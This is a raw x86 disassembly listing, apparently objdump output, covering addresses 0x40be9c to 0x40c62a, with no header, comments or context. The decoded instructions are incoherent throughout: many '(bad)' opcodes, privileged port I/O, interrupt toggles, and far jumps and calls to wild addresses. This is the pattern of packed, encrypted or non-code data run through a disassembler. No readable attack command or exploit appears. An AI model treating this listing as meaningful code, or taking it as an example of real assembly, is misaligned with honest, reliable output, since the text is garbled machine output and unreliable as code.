  40be9c:	push   0xefee82ba
  40bea1:	icebp  
  40bea2:	js     0x40be9c
  40bea4:	mov    BYTE PTR [bx+0x28],al
  40bea8:	mov    eax,ds:0x23656b3c
  40bead:	mov    eax,DWORD PTR gs:[edx-0x3a5a2a65]
  40beb4:	cld    
  40beb5:	adc    eax,0x95650722
  40beba:	mov    eax,ds:0xbbfb13d5
  40bebf:	shl    BYTE PTR [ebx+0x131e40f8],1
  40bec5:	sbb    cl,dh
  40bec7:	dec    BYTE PTR [ecx+0x171708b5]
  40becd:	sbb    BYTE PTR [edi-0x2b],cl
  40bed0:	(bad)  
  40bed1:	mov    esp,0x1c244d02
  40bed6:	mov    ?,WORD PTR [esi]
  40bed8:	test   BYTE PTR [esi-0x788c5881],0xc6
  40bedf:	daa    
  40bee0:	and    DWORD PTR [ebx+0xe],eax
  40bee3:	and    eax,0x17a8aa1b
  40bee8:	shl    DWORD PTR [eax],0x13
  40beeb:	xor    BYTE PTR [esi],bl
  40beed:	and    al,0xa3
  40beef:	push   0x74
  40bef1:	mov    al,ds:0x5975fd49
  40bef6:	icebp  
  40bef7:	cwde   
  40bef8:	jae    0x40bf0b
  40befa:	dec    ebx
  40befb:	imul   esi,ecx,0x26
  40befe:	mov    edx,0x1b6ea02e
  40bf03:	fwait
  40bf04:	sbb    ebp,DWORD PTR ss:[edx+0x1ec773e]
  40bf0b:	cmp    BYTE PTR [edi-0x70],cl
  40bf0e:	xchg   DWORD PTR [edx-0x12],edi
  40bf11:	jg     0x40bf7a
  40bf13:	mov    eax,0x6c53c0b4
  40bf18:	adc    DWORD PTR [edx-0x4529aaf0],edx
  40bf1e:	pop    ds
  40bf1f:	cmp    eax,0x7557aed2
  40bf24:	cmovns edx,eax
  40bf27:	(bad)  
  40bf28:	sahf   
  40bf29:	repz lahf 
  40bf2b:	aaa    
  40bf2c:	test   al,0x63
  40bf2e:	ror    BYTE PTR [esi+0x4a73ef84],cl
  40bf34:	dec    esp
  40bf35:	inc    eax
  40bf36:	pop    ecx
  40bf37:	push   0xffffffdc
  40bf39:	ret    0x19a5
  40bf3c:	mov    eax,ds:0x22021ae2
  40bf41:	in     al,0xa0
  40bf43:	jecxz  0x40bf9c
  40bf45:	push   edi
  40bf46:	test   eax,0x1e1e9b54
  40bf4b:	clc    
  40bf4c:	fld    TBYTE PTR [edx+eiz*8+0x1c]
  40bf50:	in     eax,0xa7
  40bf52:	cli    
  40bf53:	lock xlat BYTE PTR ds:[ebx]
  40bf55:	sbb    eax,DWORD PTR [esi]
  40bf57:	mov    ebx,0x8533877a
  40bf5c:	icebp  
  40bf5d:	ss dec ebx
  40bf5f:	mov    eax,0x586a4062
  40bf64:	cwde   
  40bf65:	pop    esp
  40bf66:	adc    dl,al
  40bf68:	aam    0x50
  40bf6a:	mov    al,0x46
  40bf6c:	in     eax,dx
  40bf6d:	xchg   BYTE PTR [edx+0x18],dh
  40bf70:	mov    bh,cl
  40bf72:	ret    
  40bf73:	mov    ds:0xeae5b18e,al
  40bf78:	dec    esp
  40bf79:	rcl    DWORD PTR [ebx+0x35f1f055],cl
  40bf7f:	fbld   TBYTE PTR [edx-0x40]
  40bf82:	add    al,0xeb
  40bf84:	and    DWORD PTR [ebp-0x50],edx
  40bf87:	ds pop eax
  40bf89:	test   al,0x6
  40bf8b:	add    DWORD PTR [ebp+0x53],0x21050770
  40bf92:	sahf   
  40bf93:	div    BYTE PTR [edi]
  40bf95:	mov    BYTE PTR [ebp+0x4badfe0b],al
  40bf9b:	push   edx
  40bf9c:	test   al,0x2
  40bf9e:	pushf  
  40bf9f:	mov    eax,ds:0x1aa64dad
  40bfa4:	xchg   esp,eax
  40bfa5:	mov    ebx,0x8cea9ccb
  40bfaa:	aaa    
  40bfab:	mov    ds:0xa6555690,eax
  40bfb0:	xchg   ecx,eax
  40bfb1:	ins    DWORD PTR es:[edi],dx
  40bfb2:	push   cs
  40bfb3:	jbe    0x40bf9b
  40bfb5:	pop    ecx
  40bfb6:	add    ah,BYTE PTR [ebp-0x58b47119]
  40bfbc:	push   ebx
  40bfbd:	push   esi
  40bfbe:	mov    dl,0xe7
  40bfc0:	arpl   bp,di
  40bfc2:	scas   eax,DWORD PTR es:[edi]
  40bfc3:	xchg   BYTE PTR [eax-0x49224208],bh
  40bfc9:	repnz adc bh,dl
  40bfcc:	fs stc 
  40bfce:	fldcw  WORD PTR [ebp-0x1f]
  40bfd1:	int    0x35
  40bfd3:	in     al,dx
  40bfd4:	adc    eax,0xabbe9b1b
  40bfd9:	sub    ebx,0x87472bf7
  40bfdf:	xchg   BYTE PTR [ebx-0x2ac78daa],bh
  40bfe5:	adc    BYTE PTR [ebp+0x3b8cc8ba],ah
  40bfeb:	sbb    eax,0x27617bef
  40bff0:	mov    ebp,0x57c227e1
  40bff5:	icebp  
  40bff6:	push   edi
  40bff7:	ret    
  40bff8:	xor    DWORD PTR [ebx-0x3588644],ebx
  40bffe:	push   es
  40bfff:	scas   eax,DWORD PTR es:[edi]
  40c000:	or     eax,0x1395ba0f
  40c005:	ror    esi,1
  40c007:	(bad)  
  40c008:	and    dh,BYTE PTR [edx+0x24f58da8]
  40c00e:	push   ds
  40c00f:	and    ebx,0x7521e7dd
  40c015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c016:	repnz pop eax
  40c018:	jb     0x40bf9b
  40c01a:	push   edi
  40c01b:	fiadd  DWORD PTR [esi-0x68]
  40c01e:	push   ebx
  40c01f:	mov    al,0xf2
  40c021:	mov    al,ds:0x33e11a89
  40c026:	nop
  40c027:	cld    
  40c028:	out    dx,al
  40c029:	imul   edi,DWORD PTR [eax+0x38],0xffffffb1
  40c02d:	cmp    BYTE PTR [ebx],0xca
  40c030:	shl    BYTE PTR [ebp+0x2b9e612b],cl
  40c036:	mov    edi,DWORD PTR [eax+ebp*4]
  40c039:	or     ecx,DWORD PTR [ebx]
  40c03b:	lods   eax,DWORD PTR ds:[esi]
  40c03c:	cmp    al,0xe9
  40c03e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c03f:	(bad)  
  40c040:	or     ecx,DWORD PTR ds:[ecx+edx*8+0x33]
  40c045:	data16 aad 0x95
  40c048:	sub    dh,bl
  40c04a:	leave  
  40c04b:	ror    ecx,cl
  40c04d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c04e:	jp     0x40c036
  40c050:	add    al,0xc9
  40c052:	stos   BYTE PTR es:[edi],al
  40c053:	sbb    cl,BYTE PTR [eax+ebx*1-0x13]
  40c057:	cmp    BYTE PTR [edx],cl
  40c059:	adc    ebx,DWORD PTR [edi]
  40c05b:	push   ebp
  40c05c:	or     ch,BYTE PTR [ecx-0x2fafe4dd]
  40c062:	popa   
  40c063:	xchg   ebx,eax
  40c064:	jp     0x40c0ce
  40c066:	push   0x449a5a83
  40c06b:	fwait
  40c06c:	in     eax,0x56
  40c06e:	retf   0x44b9
  40c071:	outs   dx,DWORD PTR ds:[esi]
  40c072:	pop    eax
  40c073:	dec    esi
  40c074:	or     DWORD PTR [ebx],esi
  40c076:	inc    ebp
  40c077:	jle    0x40c06f
  40c079:	jbe    0x40c0d5
  40c07b:	or     al,dh
  40c07d:	outs   dx,DWORD PTR fs:[esi]
  40c07f:	mov    BYTE PTR [edx+0x7c1bb05],ah
  40c085:	cmp    BYTE PTR [edx],bh
  40c087:	sar    BYTE PTR [esi],0xd2
  40c08a:	(bad)  
  40c08b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c08c:	icebp  
  40c08d:	push   esi
  40c08e:	jo     0x40c09e
  40c090:	popf   
  40c091:	aas    
  40c092:	mov    dh,0xbc
  40c094:	dec    edx
  40c095:	and    DWORD PTR ds:0x676af346,ecx
  40c09b:	mov    edi,0xa7ab665d
  40c0a0:	iret   
  40c0a1:	mov    bl,0x8f
  40c0a3:	push   eax
  40c0a4:	mov    eax,0xd17318f8
  40c0a9:	popf   
  40c0aa:	mov    bh,0x92
  40c0ac:	and    ebp,DWORD PTR [eax]
  40c0ae:	or     eax,0x6b0ee7db
  40c0b3:	fldcw  WORD PTR [esi+0x5b2b211]
  40c0b9:	mov    bl,0xaa
  40c0bb:	mov    ebp,0x6d57c381
  40c0c0:	clc    
  40c0c1:	out    dx,eax
  40c0c2:	xor    eax,DWORD PTR [ebx]
  40c0c4:	or     BYTE PTR [edi-0x4],al
  40c0c7:	pop    ds
  40c0c8:	adc    ebx,edi
  40c0ca:	sub    eax,0x3d376be8
  40c0cf:	out    dx,al
  40c0d0:	cmp    eax,0xeedb030
  40c0d5:	cld    
  40c0d6:	retf   0x130c
  40c0d9:	fcomip st,st(0)
  40c0db:	add    ah,bl
  40c0dd:	push   ebx
  40c0de:	add    al,0x3d
  40c0e0:	mov    esp,0x92f20aff
  40c0e5:	xor    eax,DWORD PTR [edi]
  40c0e7:	inc    edi
  40c0e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0ea:	mov    cl,0xa3
  40c0ec:	hlt    
  40c0ed:	inc    edx
  40c0ee:	dec    ecx
  40c0ef:	or     DWORD PTR [edi-0x3ea49e7b],esi
  40c0f5:	lods   al,BYTE PTR ds:[esi]
  40c0f6:	(bad)  
  40c0f7:	lea    edx,[ebx+0x6b]
  40c0fa:	pop    edx
  40c0fb:	ror    DWORD PTR [ecx+esi*1],cl
  40c0fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0ff:	lods   eax,DWORD PTR ds:[esi]
  40c100:	stos   DWORD PTR es:[edi],eax
  40c101:	sub    DWORD PTR [ecx+eiz*1],eax
  40c104:	fisub  DWORD PTR [ebx]
  40c106:	sti    
  40c107:	cli    
  40c108:	mov    esp,0xefda2af2
  40c10d:	push   ds
  40c10e:	dec    ebx
  40c10f:	mov    ah,0x11
  40c111:	nop
  40c112:	sbb    DWORD PTR es:[esi],ecx
  40c115:	cmc    
  40c116:	mov    al,ds:0x5cea1361
  40c11b:	call   0x7b390414
  40c120:	aas    
  40c121:	jnp    0x40c161
  40c123:	aas    
  40c124:	call   0x141779a4
  40c129:	mov    bh,0xab
  40c12b:	lods   al,BYTE PTR ds:[esi]
  40c12c:	mov    dl,0x47
  40c12e:	xchg   esp,eax
  40c12f:	ins    DWORD PTR es:[edi],dx
  40c130:	mov    bl,0x79
  40c132:	jae    0x40c128
  40c134:	inc    edx
  40c135:	inc    esp
  40c136:	xchg   ecx,eax
  40c137:	mov    ?,WORD PTR [edx+0x6d]
  40c13a:	jno    0x40c138
  40c13c:	mov    esp,0xd1e6f323
  40c141:	xchg   ebx,eax
  40c142:	es in  eax,dx
  40c144:	bound  ecx,QWORD PTR [eax-0x5f]
  40c147:	lods   al,BYTE PTR ds:[esi]
  40c148:	cmp    esp,DWORD PTR ds:0x9ff417c7
  40c14e:	sub    ch,dl
  40c150:	out    dx,eax
  40c151:	iret   
  40c152:	jnp    0x40c1cd
  40c154:	fstp   QWORD PTR [ebx]
  40c156:	pop    ebp
  40c157:	dec    esi
  40c158:	arpl   WORD PTR [esi+0x3433c94b],bx
  40c15e:	mov    DWORD PTR [ecx+0x1],ecx
  40c161:	leave  
  40c162:	ds test DWORD PTR es:[eax-0x7b21c6c2],0x354bed32
  40c16e:	cdq    
  40c16f:	and    ch,BYTE PTR [ecx-0x575ebd2e]
  40c175:	scas   al,BYTE PTR es:[edi]
  40c176:	jecxz  0x40c12d
  40c178:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c179:	cmpxchg ecx,ecx
  40c17c:	jge    0x40c129
  40c17e:	popf   
  40c17f:	pop    ds
  40c180:	mov    dh,0x87
  40c182:	sub    esp,DWORD PTR [esi-0x36c2dfeb]
  40c188:	pop    esp
  40c189:	mov    dh,0x5e
  40c18b:	add    eax,0x532feb25
  40c190:	jns    0x40c141
  40c192:	addr16 xchg ebx,eax
  40c194:	inc    edi
  40c195:	jecxz  0x40c173
  40c197:	inc    edx
  40c198:	dec    eax
  40c199:	push   0x1722ea33
  40c19e:	dec    edi
  40c19f:	sub    eax,DWORD PTR [edx+0x78]
  40c1a2:	(bad)  
  40c1a3:	mov    al,0xa6
  40c1a5:	jecxz  0x40c1ac
  40c1a7:	jecxz  0x40c199
  40c1a9:	test   eax,0x5f716054
  40c1ae:	rol    DWORD PTR [edi+0x18],1
  40c1b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1b2:	push   0xe9bbe37c
  40c1b7:	or     bh,dl
  40c1b9:	mov    ah,BYTE PTR [ebp-0x302dc5c6]
  40c1bf:	(bad)  
  40c1c0:	rcr    DWORD PTR [ebx+eiz*1+0x192f9b83],1
  40c1c7:	daa    
  40c1c8:	add    bl,BYTE PTR [ebp+0x7e]
  40c1cb:	out    dx,eax
  40c1cc:	aam    0x65
  40c1ce:	shr    edi,cl
  40c1d0:	scas   eax,DWORD PTR es:[edi]
  40c1d1:	jno    0x40c1ed
  40c1d3:	std    
  40c1d4:	mov    eax,ds:0xfa0de882
  40c1d9:	lds    ebx,FWORD PTR [eax]
  40c1db:	aaa    
  40c1dc:	push   ecx
  40c1dd:	cld    
  40c1de:	xchg   ebx,eax
  40c1df:	inc    esi
  40c1e0:	fstp   QWORD PTR [eax+ebp*1]
  40c1e3:	sbb    ch,ch
  40c1e5:	lock sbb eax,0x9f0bd08c
  40c1eb:	push   edx
  40c1ec:	test   eax,0xc6e677ec
  40c1f1:	xchg   edi,eax
  40c1f2:	push   esi
  40c1f3:	sbb    edx,DWORD PTR [ebp-0x42112f0]
  40c1f9:	mov    ebx,0x373bf418
  40c1fe:	(bad)  
  40c1ff:	(bad)  [esi-0x3e603226]
  40c205:	sbb    edx,edx
  40c207:	cdq    
  40c208:	fcmovu st,st(5)
  40c20a:	arpl   WORD PTR [esi-0x666de358],di
  40c210:	pop    ebx
  40c211:	mov    DWORD PTR [esi],esi
  40c213:	js     0x40c236
  40c215:	mov    bl,0x3a
  40c217:	outs   dx,DWORD PTR ds:[esi]
  40c218:	sub    ebp,DWORD PTR [eax+eiz*1+0x7717aecd]
  40c21f:	cmp    esp,esp
  40c221:	iret   
  40c222:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c223:	add    eax,0x3739fccb
  40c228:	dec    edx
  40c229:	lods   al,BYTE PTR ds:[esi]
  40c22a:	mov    edi,0x47c7db1f
  40c22f:	sti    
  40c230:	mov    al,0x2
  40c232:	int    0xa4
  40c234:	data16 prefetch BYTE PTR [edi+0x16]
  40c239:	(bad)  
  40c23a:	stos   BYTE PTR es:[edi],al
  40c23b:	cmc    
  40c23c:	mov    dl,0x5f
  40c23e:	stos   BYTE PTR es:[edi],al
  40c23f:	ret    0x7ba4
  40c242:	stos   DWORD PTR es:[edi],eax
  40c243:	icebp  
  40c244:	daa    
  40c245:	xor    cl,0x82
  40c248:	sbb    DWORD PTR [edx+eiz*2-0x14ca8f84],ebx
  40c24f:	xchg   ebp,eax
  40c250:	leave  
  40c251:	push   esi
  40c252:	shr    BYTE PTR [eax+0x7],cl
  40c255:	pop    ebx
  40c256:	jmp    0x35f10ff4
  40c25b:	pop    ebp
  40c25c:	jge    0x40c1f7
  40c25e:	xor    cl,BYTE PTR [ebp-0x3f082e4f]
  40c264:	pop    es
  40c265:	fidivr WORD PTR [edi+eiz*4]
  40c268:	pusha  
  40c269:	pop    ecx
  40c26a:	and    eax,0x9d4f8786
  40c26f:	push   ebx
  40c270:	loope  0x40c27e
  40c272:	jb     0x40c250
  40c274:	lds    edi,FWORD PTR [edx-0x3e38fa40]
  40c27a:	sub    al,al
  40c27c:	push   edi
  40c27d:	jne    0x40c2f9
  40c27f:	add    al,dh
  40c281:	out    dx,eax
  40c282:	inc    ecx
  40c283:	dec    eax
  40c284:	jns    0x40c2d5
  40c286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c287:	out    0xff,eax
  40c289:	or     dl,cl
  40c28b:	or     al,0x39
  40c28d:	cwde   
  40c28e:	or     esp,0xc3c1bd48
  40c294:	fcom   QWORD PTR [ebp-0xc]
  40c297:	jl     0x40c289
  40c299:	fsubr  QWORD PTR ds:0xda057a13
  40c29f:	mov    eax,ds:0x4629eb4e
  40c2a4:	fisub  WORD PTR [esi+0x9d6efb0]
  40c2aa:	leave  
  40c2ab:	addr16 xchg esi,eax
  40c2ad:	cdq    
  40c2ae:	inc    ebx
  40c2af:	mov    edx,0xb5aa187a
  40c2b4:	jns    0x40c2cf
  40c2b6:	sub    eax,0xbaaf348f
  40c2bb:	cwde   
  40c2bc:	or     DWORD PTR [ecx-0x6c377266],ebx
  40c2c2:	or     BYTE PTR ds:0x689fcc01,bl
  40c2c8:	jne    0x40c286
  40c2ca:	sub    eax,0x751c0551
  40c2cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2d0:	jns    0x40c28b
  40c2d2:	fcmovu st,st(6)
  40c2d4:	adc    DWORD PTR [esi],edx
  40c2d6:	enter  0x8ef2,0x8c
  40c2da:	xor    ecx,DWORD PTR [ebp-0x5605197c]
  40c2e0:	jg     0x40c343
  40c2e2:	enter  0x4941,0x7
  40c2e6:	call   0x7d1b:0xeeedc846
  40c2ed:	iret   
  40c2ee:	cld    
  40c2ef:	test   BYTE PTR [esi+0x26cbb886],0xc8
  40c2f6:	stos   BYTE PTR es:[edi],al
  40c2f7:	pop    esi
  40c2f8:	pop    ds
  40c2f9:	and    eax,0x4b83249
  40c2fe:	call   0xbf7f116d
  40c303:	xchg   DWORD PTR cs:[ecx+0x460b76e5],ecx
  40c30a:	retf   0x167a
  40c30d:	mov    ebx,0xd5a98bce
  40c312:	adc    BYTE PTR [edi+0x1f6c89f5],al
  40c318:	pop    edx
  40c319:	getsec 
  40c31b:	mov    dh,0x2f
  40c31d:	cmp    esi,eax
  40c31f:	sbb    ebx,DWORD PTR [ebx+0x229f294c]
  40c325:	arpl   bp,cx
  40c327:	scas   eax,DWORD PTR es:[edi]
  40c328:	adc    ecx,DWORD PTR [ebp+0xfb93d4c]
  40c32e:	cli    
  40c32f:	push   ss
  40c330:	inc    ebx
  40c331:	cmc    
  40c332:	mov    al,ds:0xcb0bb1c3
  40c337:	mov    edx,0x74ef57bb
  40c33c:	dec    ecx
  40c33d:	jns    0x40c305
  40c33f:	std    
  40c340:	jecxz  0x40c367
  40c342:	test   eax,0x93433151
  40c347:	jb     0x40c316
  40c349:	add    al,0x7d
  40c34b:	je     0x40c342
  40c34d:	xchg   esi,eax
  40c34e:	jnp    0x40c313
  40c350:	imul   esp,DWORD PTR [ebp-0x5381e603],0x4d076077
  40c35a:	or     DWORD PTR [edi-0x6b],ecx
  40c35d:	jp     0x40c2f4
  40c35f:	dec    ebp
  40c360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c361:	mov    ch,0x1
  40c363:	imul   ebx,DWORD PTR [ebx+0x541790fd],0xffffffcb
  40c36a:	jecxz  0x40c32d
  40c36c:	pop    ebx
  40c36d:	sti    
  40c36e:	xor    al,0xe7
  40c370:	cmp    BYTE PTR ds:0x3c184357,al
  40c376:	jb     0x40c332
  40c378:	push   ds
  40c379:	cdq    
  40c37a:	mov    dh,0xde
  40c37c:	add    BYTE PTR [eax],ah
  40c37e:	addr16 popf 
  40c380:	jno    0x40c365
  40c382:	sbb    ecx,DWORD PTR [ecx-0x2f]
  40c385:	push   0xffffffe8
  40c387:	inc    esi
  40c388:	mov    WORD PTR [edi],es
  40c38a:	xchg   esi,eax
  40c38b:	je     0x40c39e
  40c38d:	imul   edx,DWORD PTR [ecx+esi*1-0x26227a0e],0x7
  40c395:	xchg   ecx,eax
  40c396:	in     al,0xaa
  40c398:	cld    
  40c399:	stos   DWORD PTR es:[edi],eax
  40c39a:	adc    bh,al
  40c39c:	lds    ebp,FWORD PTR [esi]
  40c39e:	daa    
  40c39f:	push   cs
  40c3a0:	scas   eax,DWORD PTR es:[edi]
  40c3a1:	lea    eax,[ecx]
  40c3a3:	jns    0x40c3c7
  40c3a5:	nop
  40c3a6:	outs   dx,DWORD PTR ds:[esi]
  40c3a7:	ja     0x40c339
  40c3a9:	mov    ebx,0xef9f1103
  40c3ae:	ror    BYTE PTR [esi],cl
  40c3b0:	into   
  40c3b1:	push   edx
  40c3b2:	out    dx,eax
  40c3b3:	xchg   WORD PTR [esi-0x327b5826],dx
  40c3ba:	mov    bl,0xe5
  40c3bc:	test   al,0x71
  40c3be:	add    eax,0x65d5e6a3
  40c3c3:	sar    DWORD PTR [ecx+edx*4-0x3ce224fb],0xe6
  40c3cb:	mov    ecx,0x1c141726
  40c3d0:	jp     0x40c369
  40c3d2:	loopne 0x40c423
  40c3d4:	add    eax,0x6e2497da
  40c3d9:	mov    ds:0x87107bd1,eax
  40c3de:	es fs push cs
  40c3e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3e2:	adc    eax,0x6eeddbdc
  40c3e7:	retf   
  40c3e8:	arpl   WORD PTR [esi-0x60d53a4f],bx
  40c3ee:	out    dx,eax
  40c3ef:	mov    edi,0xc1a8d39a
  40c3f4:	enter  0xe400,0x4e
  40c3f8:	pop    esi
  40c3f9:	pushf  
  40c3fa:	xchg   esi,eax
  40c3fb:	sbb    edi,DWORD PTR [esi-0xae9f4ca]
  40c401:	xchg   edx,eax
  40c402:	je     0x40c3fc
  40c404:	test   BYTE PTR [ecx-0x78c4d85d],0x4d
  40c40b:	inc    edx
  40c40c:	and    al,BYTE PTR [ebx+0x32a7f096]
  40c412:	or     DWORD PTR [ecx-0x53c1b41a],ebp
  40c418:	outs   dx,DWORD PTR ds:[esi]
  40c419:	jecxz  0x40c48a
  40c41b:	and    dh,BYTE PTR [ebp-0x55]
  40c41e:	stos   BYTE PTR es:[edi],al
  40c41f:	or     al,0x56
  40c421:	retf   
  40c422:	loopne 0x40c3f5
  40c424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c425:	rol    DWORD PTR [esi+0x66fe0dbf],cl
  40c42b:	dec    esi
  40c42c:	mov    dl,BYTE PTR [edx+0x7b0b47c9]
  40c432:	cmp    DWORD PTR [edx],ebp
  40c434:	or     edi,ebp
  40c436:	cmp    al,0x25
  40c438:	jns    0x40c3f8
  40c43a:	inc    edx
  40c43b:	adc    dl,al
  40c43d:	push   edx
  40c43e:	retf   
  40c43f:	aad    0xfe
  40c441:	loope  0x40c408
  40c443:	sbb    BYTE PTR [ecx-0x695b988e],ch
  40c449:	adc    ch,ch
  40c44b:	sub    eax,0xf24a8a30
  40c450:	mov    ch,0x31
  40c452:	aad    0x31
  40c454:	div    BYTE PTR [esi]
  40c456:	nop
  40c457:	xor    BYTE PTR [ebx],ch
  40c459:	dec    esi
  40c45a:	jns    0x40c44a
  40c45c:	sub    DWORD PTR [edi-0x6c245f87],eax
  40c462:	or     ecx,ebx
  40c464:	ret    0x4
  40c467:	out    0x7,eax
  40c469:	leave  
  40c46a:	inc    ebx
  40c46b:	mov    dl,0x3
  40c46d:	aaa    
  40c46e:	in     al,0xc8
  40c470:	adc    ch,dl
  40c472:	xchg   ecx,eax
  40c473:	mov    dl,0x33
  40c475:	cmp    ecx,edx
  40c477:	mov    dl,0x2e
  40c479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c47a:	xchg   DWORD PTR [ecx+0x215a6f58],edx
  40c480:	fdivp  st(7),st
  40c482:	call   0x3dbe3833
  40c487:	out    0xc9,eax
  40c489:	fidivr WORD PTR [esi]
  40c48b:	and    BYTE PTR [edi],0xaf
  40c48e:	in     al,dx
  40c48f:	inc    BYTE PTR [esi+0x1]
  40c492:	retf   
  40c493:	in     al,dx
  40c494:	lds    ebx,FWORD PTR [edi+0x724af69a]
  40c49a:	ds std 
  40c49c:	sbb    ah,al
  40c49e:	adc    edi,edi
  40c4a0:	cmc    
  40c4a1:	pop    ebx
  40c4a2:	sbb    DWORD PTR [eax+0x6f],edi
  40c4a5:	inc    edi
  40c4a6:	pushf  
  40c4a7:	and    eax,0xfee13712
  40c4ac:	ret    0x3aa9
  40c4af:	pushf  
  40c4b0:	sti    
  40c4b1:	mov    ebp,0x436b7567
  40c4b6:	sub    ah,BYTE PTR [ecx]
  40c4b8:	push   ecx
  40c4b9:	xchg   esi,eax
  40c4ba:	popa   
  40c4bb:	(bad)  
  40c4bc:	mov    eax,es:0x4e2823ca
  40c4c2:	mov    esi,0x2ad97cf1
  40c4c7:	sub    DWORD PTR [esi],esi
  40c4c9:	sbb    cl,BYTE PTR [edi+0x44]
  40c4cc:	mov    DWORD PTR [eax-0x6b5c9714],edi
  40c4d2:	cmp    esp,DWORD PTR [eax-0x56d82a8c]
  40c4d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4d9:	mov    edi,0xa4dfa31e
  40c4de:	jae    0x40c488
  40c4e0:	mul    BYTE PTR [ebp+0x5220b987]
  40c4e6:	inc    edx
  40c4e7:	push   edi
  40c4e8:	sti    
  40c4e9:	icebp  
  40c4ea:	aaa    
  40c4eb:	sti    
  40c4ec:	sub    DWORD PTR [ecx],edx
  40c4ee:	mov    bh,0xa9
  40c4f0:	mov    dh,0x93
  40c4f2:	sub    eax,ebp
  40c4f4:	push   cs
  40c4f5:	or     eax,esi
  40c4f7:	pop    esi
  40c4f8:	stc    
  40c4f9:	push   es
  40c4fa:	inc    esp
  40c4fb:	rcr    DWORD PTR [edx],cl
  40c4fd:	and    esi,edx
  40c4ff:	out    dx,al
  40c500:	mov    ebx,0x50ccebbf
  40c505:	adc    ebp,ebp
  40c507:	outs   dx,DWORD PTR ds:[esi]
  40c508:	jmp    0x2ba7ead4
  40c50d:	inc    ecx
  40c50e:	sub    dh,BYTE PTR [ecx+edx*1-0x3f9f30ee]
  40c515:	push   ebx
  40c516:	daa    
  40c517:	jmp    0x7b6f9c0e
  40c51c:	jl     0x40c541
  40c51e:	xchg   esp,eax
  40c51f:	mov    esp,0xa12bfabc
  40c524:	jmp    0x8cb6:0xff3ecc94
  40c52b:	cmp    DWORD PTR ds:0x28b4e7e3,esp
  40c531:	or     al,0x3a
  40c533:	or     ebp,DWORD PTR [eax]
  40c535:	jge    0x40c4db
  40c537:	mov    dl,0x56
  40c539:	mov    DWORD PTR [ecx],esi
  40c53b:	sub    bl,BYTE PTR [edx]
  40c53d:	adc    BYTE PTR [eax],dh
  40c53f:	popf   
  40c540:	xor    BYTE PTR [ebx-0x27da0830],dl
  40c546:	dec    ebx
  40c547:	jecxz  0x40c54b
  40c549:	mov    ebx,0xdd18313c
  40c54e:	dec    esp
  40c54f:	sub    DWORD PTR [edx-0x67],esp
  40c552:	push   es
  40c553:	add    BYTE PTR [ebx-0x5ada2d6a],bl
  40c559:	(bad)  
  40c55a:	jecxz  0x40c4f0
  40c55c:	lods   al,BYTE PTR ds:[esi]
  40c55d:	sbb    cl,al
  40c55f:	ja     0x40c513
  40c561:	adc    dl,BYTE PTR [ebp-0x29]
  40c564:	fdiv   QWORD PTR [esp+eiz*4-0x1f888a93]
  40c56b:	lods   eax,DWORD PTR ds:[esi]
  40c56c:	inc    esi
  40c56d:	test   BYTE PTR [ebx+0x64055af6],bl
  40c573:	mov    al,0x3a
  40c575:	adc    al,BYTE PTR [edi+0x20b5f5a6]
  40c57b:	std    
  40c57c:	adc    ch,BYTE PTR [esi]
  40c57e:	stc    
  40c57f:	enter  0x5f88,0xc3
  40c583:	mov    esi,0x9e48753b
  40c588:	stc    
  40c589:	sbb    esi,DWORD PTR [esi+0x58002d10]
  40c58f:	test   dl,ch
  40c591:	in     eax,0xf4
  40c593:	jle    0x40c603
  40c595:	ss dec edx
  40c597:	mov    edi,0x2918f53a
  40c59c:	push   ecx
  40c59d:	outs   dx,DWORD PTR ds:[esi]
  40c59e:	xor    al,0xba
  40c5a0:	(bad)  
  40c5a1:	mov    ecx,0x69be621
  40c5a6:	jne    0x40c595
  40c5a8:	aam    0x60
  40c5aa:	pop    esi
  40c5ab:	out    0x48,al
  40c5ad:	ret    0xe1f8
  40c5b0:	not    cl
  40c5b2:	mov    eax,0xac95bbb7
  40c5b7:	dec    ecx
  40c5b8:	dec    ebp
  40c5b9:	loopne 0x40c5a0
  40c5bb:	dec    eax
  40c5bc:	or     eax,0x28eaea23
  40c5c1:	push   es
  40c5c2:	mov    esp,0x69158eb6
  40c5c7:	sti    
  40c5c8:	adc    al,BYTE PTR [ebx-0x1e04fe9d]
  40c5ce:	mov    edi,0x26bc1e90
  40c5d3:	in     eax,0x2c
  40c5d5:	popf   
  40c5d6:	dec    ecx
  40c5d7:	data16 fmul st(0),st
  40c5da:	inc    ebp
  40c5db:	stc    
  40c5dc:	pop    es
  40c5dd:	iret   
  40c5de:	mov    edx,0x339716ca
  40c5e3:	jmp    0x40c58c
  40c5e5:	adc    DWORD PTR [edx],ebp
  40c5e7:	and    BYTE PTR [esi-0x5f2ccbd8],bl
  40c5ed:	cmovs  esp,DWORD PTR [edx+0xeea0deb]
  40c5f4:	sbb    edx,esp
  40c5f6:	ficomp DWORD PTR [esi-0xf994460]
  40c5fc:	push   sp
  40c5fe:	inc    ecx
  40c5ff:	jle    0x40c61b
  40c601:	into   
  40c602:	xor    BYTE PTR [edi-0x2c29abed],ch
  40c608:	mov    al,ds:0xbb1d4ffb
  40c60d:	out    0x38,eax
  40c60f:	repz and eax,0x1b092983
  40c615:	retf   
  40c616:	in     eax,dx
  40c617:	out    dx,eax
  40c618:	test   DWORD PTR [edx-0xc],ebx
  40c61b:	sbb    dh,BYTE PTR [ebx]
  40c61d:	lock int3 
  40c61f:	out    dx,al
  40c620:	fisttp WORD PTR [edx-0x159b70db]
  40c626:	cmp    dl,dl
  40c628:	or     bl,bl
  40c62a:	ins    BYTE PTR es:[edi],dx
